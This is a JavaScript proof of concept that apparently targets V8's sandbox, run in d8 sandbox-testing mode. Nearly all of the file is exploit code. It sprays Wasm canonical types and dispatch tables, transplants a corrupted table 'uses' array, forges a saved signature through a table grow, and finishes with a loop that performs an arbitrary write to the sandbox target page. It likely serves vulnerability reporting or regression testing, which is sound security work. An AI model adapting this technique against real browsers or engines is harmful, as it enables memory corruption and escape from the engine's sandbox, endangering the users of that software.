// --sandbox-testing
d8.file.execute('./wasm-module-builder.js');

// Prepare corruption utilities.
const kHeapObjectTag = 1;
const kSmiTagSize = 1;
const kWasmTableObjectUsesOffset = 0x18;
const kFixedArrayEntryOffset = 0x8;
// WasmDispatchTable offsets
const kLengthOffset = 0x4;
const kEntriesOffset = 0xc;
const kEntrySize = 0x10;
const kSigBias = 0xc;
let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

// We spray the following table-related trusted objects:
// 1. ProtectedFixedArray<WasmDispatchTable>: [0x40010, 0xc0000)
// 2. WasmDispatchTable objects (tagged pointer spray): incl. DT_SPRAY
// 2. WasmDispatchTable objects (target tables): incl. DT_TARGET
// We use canonical type index of each entries in the dispatch table as a tagged pointer within the trusted region.
// Goal: overwrite saved signature of entry 0xf in the dispatch table into $sig_v_ll
const DT_ARRAY = 0x40010;     // some variance won't matter because of 0x40000 alignment & huge spray
const DT_SPRAY = 0x600010;    // spray size 30000*(3+4*0x10)*4 = 0x7aae40
const DT_SPRAY_CNT = 30000;
const DT_TARGET = 0x1400010;  // target size 70000*(3+4*0x10)*4 = 0x11e4140

function getMarkerSig(idx) {
  return idx.toString(2).padStart(32, '0').split('').map(v=>v==='0'?kWasmI32:kWasmI64);
}

// fill canonical indices to target
// next canonical idx: 3
let next_canon_idx = 3;
console.log("Filling canonical indices...");
{
  // init signature types
  const builder = new WasmModuleBuilder();
  let $struct = builder.addStruct([makeField(kWasmI64, true)]);     // cidx 3
  builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));   // cidx 4
  builder.addType(makeSig([kWasmI64, kWasmI64], []));               // cidx 5
  builder.instantiate();
  next_canon_idx += 3;
}
{
  for (let i = 0; next_canon_idx + 1000000 < DT_TARGET; i += 1, next_canon_idx += 1000000) {
    const builder = new WasmModuleBuilder();
    builder.startRecGroup();
    for (let i = 0; i < 1000000 - 1; i++) {
      builder.addArray(kWasmI64);
    }
    // we don't actually need these instances, intentionally fail after canonicalization
    builder.addType(makeSig(getMarkerSig(i), []), true, 999999); // self-ref, fail
    builder.endRecGroup();
    try { builder.instantiate(); } catch {}
  }
}

// target module
console.log("Creating target module...");
let builder = new WasmModuleBuilder();

// allocate types to actually use
let $struct = builder.addStruct([makeField(kWasmI64, true)]);
let $sig_v_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], []));
let $sig_v_ll = builder.addType(makeSig([kWasmI64, kWasmI64], []));

// allocate types to use as canonical index spray values
// next canonical idx: next_canon_idx
builder.startRecGroup();
const fake_shift = kEntriesOffset + kSigBias - kLengthOffset;
const fake_tag = DT_TARGET + kEntrySize * 0xf + fake_shift + kHeapObjectTag;
for (let i = 0; i < fake_tag - next_canon_idx; i++) {
  builder.addArray(kWasmI64);
}
builder.endRecGroup();
// next canonical idx: DT_TARGET + kEntriesOffset + kSigBias - kLengthOffset + kHeapObjectTag
// fake WasmDispatchTable's length -> signature, capacity -> next WasmDispatchTable map (> 5)
let $sig_0 = builder.addType(makeSig([kWasmF64], []));

// allocate writer & placeholder functions
let $writer = builder.addFunction("writer", $sig_v_ls)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kGCPrefix, kExprStructSet, $struct, 0,
  ]);
let $f0 = builder.addFunction("f0", $sig_0).exportFunc().addBody([]);

// table cap
let tcap = 100000;

// just used for supplying `uses` FixedArray
builder.addTable(wasmRefType($sig_v_ls), 1, 1, [kExprRefFunc, $writer.index]).exportAs("table_fa");
tcap -= 1;

// WasmTableObject to be grown for the exploit
// must be a non-func table to avoid WasmTableObject::SetFunctionTableEntry()
// grow by 1 => new length 5 equivalent w/ canonical signature of $sig_v_ll
builder.addTable(wasmRefNullType(kWasmExternRef), 4, 5).exportAs(`table_exp0`);
tcap -= 1;

// spray fake tagged trusted object values
const per_spray_sz = kEntriesOffset + kEntrySize * 4;
for (let i = 0; i < DT_SPRAY_CNT; i++) {
  builder.addTable(kWasmFuncRef, 0x10, 0x10, [kExprRefFunc, $f0.index]);
}
tcap -= DT_SPRAY_CNT;

// spray target tables, also helps to allocate trusted objects at stable offsets
const tgt_cnt = tcap;
for (let i = 0; i < tgt_cnt; i++) {
  let $table = builder.addTable(kWasmFuncRef, 0x10, 0x10, [kExprRefFunc, $writer.index]);

  builder.addFunction(`boom_${i}`, $sig_v_ll)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
    kExprI32Const, 0xf,
    kExprCallIndirect, $sig_v_ll, ...wasmUnsignedLeb($table.index),
  ]);
}

let instance0 = builder.instantiate();
let exp = instance0.exports;

console.log("Triggering dispatch table length overwrite...");

// fetch table_expX
let {table_exp0} = exp;

// table_fa->uses()[1] = idx (in smi)
const {table_fa} = exp;
let table_fa_uses = getField(getPtr(table_fa), kWasmTableObjectUsesOffset);
function set_index(idx) {
  setField(table_fa_uses, kFixedArrayEntryOffset + 0x4, idx << kSmiTagSize);
}
// transplant table_exp0->uses = table_fa->uses
setField(getPtr(table_exp0), kWasmTableObjectUsesOffset, table_fa_uses);

// overwrite saved signature of entry 0 in the dispatch table into $sig_v_ll
set_index(
  (
    // location of fake tagged WasmDispatchTable
    // using first signature, thus kEntrySize * 0
    (DT_SPRAY + kEntriesOffset + kSigBias) + kEntrySize * 0
    - (DT_ARRAY + kFixedArrayEntryOffset)
  ) / 4
);
table_exp0.grow(1);

console.log("Triggering arbitrary write...");
for (let i = 0; i < tgt_cnt; i++) {
  try {
    exp[`boom_${i}`](BigInt(Sandbox.targetPage) - 7n, 0x42n);
  } catch { }
}
console.log("This should not be reached.");

/*
ProtectedFixedArray<WasmDispatchTable> {
  Map map = 0x000005bd;
  smi length;
  Tagged<WasmDispatchTable> dispatch_tables[length];
}

WasmDispatchTable {
  Map map = 0x00001f7d;
  int length;
  int capacity;
  Entry {
    void* target;         // [0, 8)
    Tagged<Object> ref;   // [8, 0xc)
    int32_t sig;          // [0xc, 0x10) / canonical signature id
  } entries[length];
}
*/
